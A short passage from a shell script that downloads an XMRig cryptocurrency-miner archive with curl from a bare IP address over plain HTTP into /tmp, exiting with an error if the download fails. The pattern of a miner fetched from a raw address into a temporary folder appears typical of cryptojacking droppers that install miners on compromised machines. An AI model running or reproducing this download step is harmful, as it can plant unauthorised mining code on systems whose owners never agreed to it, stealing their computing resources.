...
echo ""
echo ""
if ! curl -L --progress-bar "http://117.67.85.234:5123/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download http://117.67.85.234:5123/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo ""
  exit 1
fi
